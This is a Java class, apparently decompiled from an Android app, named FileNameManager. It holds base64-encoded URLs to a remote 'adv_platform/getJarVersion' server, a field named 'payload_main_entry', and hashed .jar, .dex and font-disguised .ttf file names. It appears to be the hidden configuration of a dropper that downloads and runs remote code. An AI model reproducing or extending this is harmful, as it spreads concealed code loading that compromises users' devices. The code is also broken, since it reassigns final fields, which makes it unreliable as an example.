package com.ljtq.res.ut;

public final class FileNameManager {
    private static String TAG = "restag";
    private static String URL1 = "aHR0cDovL24xNTEuaGF0Y2hiZWVuLmNvbTo4MDgwL2Fkdl9wbGF0Zm9ybS9nZXRKYXJWZXJzaW9uL2NwaWQvdmVyc2lvbl9jb2RlL2NvdW50cnk=";
    private static String URL2 = "aHR0cDovL24xNTIuaGF0Y2hiZWVuLmNvbTo4MDgwL2Fkdl9wbGF0Zm9ybS9nZXRKYXJWZXJzaW9uL2NwaWQvdmVyc2lvbl9jb2RlL2NvdW50cnk=";
    private static String j = "m5";
    private static String payload_main_entry = "Y29tLmxqdHEucmVzLmltcGwuTGF1Y2g=";
    private static final String filename = null;
    public static final String filename_jar = null;
    public static final String filename_dex = null;
    public static final String filename_ttf = null;
    private static String core_version = "core_verion";
    private static String core_version_value = "23";
    private static String last_runtime = "lastRunTime";
    private static String cid = "cid";
    private static String pid = "pid";

    static {
        FileNameManager.filename = new StringBuilder(String.valueOf("ljtq".hashCode())).toString();
        FileNameManager.filename_jar = String.valueOf(FileNameManager.filename) + ".jar";
        FileNameManager.filename_dex = String.valueOf(FileNameManager.filename) + ".dex";
        FileNameManager.filename_ttf = String.valueOf(FileNameManager.filename) + ".ttf";
    }

    public FileNameManager() {
        super();
    }
}

